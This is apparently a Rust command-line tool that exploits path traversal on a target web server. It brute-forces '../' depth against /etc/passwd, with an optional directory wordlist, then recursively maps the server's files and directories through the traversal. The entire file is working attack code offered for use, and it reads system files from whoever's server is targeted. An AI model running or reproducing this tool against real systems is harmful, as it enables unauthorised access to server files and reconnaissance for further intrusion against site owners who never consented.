use std::{io, str};
use std::fs::File;
use clap::Parser;
use curl::easy::Easy;
use linereader::LineReader;

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Args {
    /// Target host URL
    #[arg(short='u' , long="url", required = true)]
    url: String,

    /// Number of level to attempt path traversal
    #[arg(short='l', long="level", default_value_t=8)]
    max_traversal_level: usize,

    /// Name of the vulnerable directory (if known)
    #[arg(short='d', long="vulnerable-directory", required = false)]
    vulnerable_directory: String,

    /// File extension to lookup
    #[arg(short='e', long="extensions", required = true)]
    extensions: Vec<String>,

    /// Wordlist for path and file name lookup
    #[arg(short='w', long="wordlist", required = true)]
    wordlist: String,

    /// Outputs directory attempts
    #[arg(short='v', long="verbose", default_value_t=false)]
    verbose: bool,
}

const ROOT_TARGET_FILE: &str = "etc/passwd";
const TRAVERSAL_LEVEL_STRING: &str = "../";
const WINDOWS_LINE_ENDING: &str = "\r\n";
const LINUX_LINE_ENDING: &str = "\n";

fn main() {
    let args = Args::parse();

    println!("== Starting Search for Root path ==");
    println!("Target host: {}", args.url);
    println!("Target file: /{}", ROOT_TARGET_FILE);

    if !args.vulnerable_directory.is_empty() {
        println!("Vulnerable Directory: /{}", args.vulnerable_directory);
    }

    println!("Max search levels: {}", args.max_traversal_level);
    println!("Wordlist: {}", args.wordlist);
    println!("===");

    let (vulnerable_directory, root_level) = match args.vulnerable_directory.is_empty() {
        true => {
            println!("This might take a while...");
            find_root_path_with_directory_search(&args.url, &args.max_traversal_level, &args.wordlist, args.verbose)
        }

        false => {
            let root_level = find_root_path_without_directory_search(&args.url, &args.max_traversal_level, &args.vulnerable_directory, args.verbose);
            (args.vulnerable_directory, root_level)
        }
    };

    println!("== Root path found ==");
    println!("Vulnerable directory: /{}", &vulnerable_directory);
    println!("Level: {}", root_level);
    println!("Sample path: {}", build_request_path(&args.url, &vulnerable_directory, &root_level, ""));
    println!("== Running directory mapping ==");

    directory_tree(&args.url, &root_level, &vulnerable_directory, &args.wordlist, args.extensions);
}

fn directory_tree(
    url: &String,
    root_traversal_level: &usize,
    vulnerable_directory: &String,
    wordlist_path: &String,
    extensions: Vec<String>
) {
    let mut request = build_request_object();
    let base_request_path = build_base_request_path(&url, &vulnerable_directory, &root_traversal_level);

    let mut extensions = extensions;
    extensions.push(String::new()); // To lookup base files and directories

    subdirectory_tree(&mut request, &base_request_path, wordlist_path, &extensions);
}

fn subdirectory_tree(
    request: &mut Easy,
    base_request_path: &String,
    wordlist_path: &String,
    extensions: &Vec<String>
) {
    let mut wordlist_reader = get_wordlist(wordlist_path);

    while let Some(line) = wordlist_reader.next_line() {
        let word = format_word(line);

        if word.is_empty() {
            continue;
        }

        for extension in extensions {
            let request_path_file = match extension.is_empty() {
                true => format!("{}{}/", base_request_path, word),
                false => format!("{}{}.{}", base_request_path, word, extension)
            };

            request.url(&request_path_file).unwrap();

            match request.perform() {
                Ok(..) => { },
                Err(_error) => { }
            };

            match request.response_code().unwrap() {
                // (Success) File
                200 =>
                    println!("File: {}", request_path_file),

                // (Forbidden) Directory
                403 => {
                    println!("Directory: {}", request_path_file);
                    subdirectory_tree(request, &request_path_file, &wordlist_path, extensions)
                },

                // (Not Found) Nothing found
                404 => { },

                _ => panic!("Unexpected response code: {}", request.response_code().unwrap())
            }
        }
    }
}

fn find_root_path_without_directory_search(
    url: &String,
    max_traversal_level: &usize,
    vulnerable_directory: &String,
    verbose: bool
) -> usize {
    let mut request = build_request_object();

    for level in 0..*max_traversal_level {
        let request_path = build_request_path(&url, &vulnerable_directory, &level, ROOT_TARGET_FILE);

        request.url(&request_path).unwrap();

        match request.perform() {
            Ok(..) => { },
            Err(_error) => { }
        };

        match request.response_code().unwrap() {
            200 => {
                return level
            }

            _ => {
                if verbose {
                    println!("level {} directory /{}: Not found", level, &vulnerable_directory)
                }
            }
        }
    }

    panic!("== Could not find root path ==");
}

fn find_root_path_with_directory_search(
    url: &String,
    max_traversal_level: &usize,
    wordlist_path: &String,
    verbose: bool
) -> (String, usize) {
    let mut request = build_request_object();
    let mut wordlist_reader = get_wordlist(wordlist_path);

    while let Some(line) = wordlist_reader.next_line() {
        let word = format_word(line);

        for level in 0..*max_traversal_level {
            let request_path = build_request_path(&url, &word, &level, ROOT_TARGET_FILE);

            request.url(&request_path).unwrap();

            match request.perform() {
                Ok(..) => { },
                Err(_error) => { }
            };

            match request.response_code().unwrap() {
                200 => {
                    return (word, level)
                }

                _ => {
                    if verbose {
                        println!("level {} word /{}: Not found", level, &word)
                    }
                }
            }
        }
    }

    panic!("== Could not find root path ==");
}

fn build_base_request_path(url: &String, directory: &str, level: &usize) -> String {
    build_request_path(url, directory, level, "")
}

fn build_request_path(url: &String, directory: &str, level: &usize, target_file: &str) -> String {
    let traversal_path = build_traversal_path(level);

    match directory.len() {
        0 =>
            format!("{url}/{traversal_path}{target_file}"),

        _ => {
            let encoded_directory = urlencoding::encode(directory);
            format!("{url}/{encoded_directory}/{traversal_path}{target_file}")
        }
    }
}

fn build_traversal_path(size: &usize) -> String {
    TRAVERSAL_LEVEL_STRING.repeat(*size)
}

fn build_request_object() -> Easy {
    let mut easy = Easy::new();
    easy.path_as_is(true).unwrap();
    easy.get(true).unwrap();

    // Used to prevent download of large files.
    //
    // This significantly increases the request time, so the value is a mid-ground where most
    //  files are small enough to be downloaded, but large files are not.
    easy.max_filesize(1024 * 64).unwrap();

    easy
}

fn format_word(line: io::Result<&[u8]>) -> String {
    let line = line.expect("Could not read next wordlist line");

    let mut word = str::from_utf8(&line).unwrap();
    word = word.strip_suffix(LINUX_LINE_ENDING)
        .or(word.strip_suffix(WINDOWS_LINE_ENDING))
        .unwrap_or(word);

    urlencoding::encode(word).to_string()
}

fn get_wordlist(file_path: &String) -> LineReader<File> {
    // Read-only should allow multiple file descriptors for the same file
    let result = File::options()
        .read(true)
        .write(false)
        .create(false)
        .open(file_path);

    match result {
        Ok(file) =>
            LineReader::new(file),

        Err(error) =>
            panic!("There was a problem opening the file: {:?}", error),
    }
}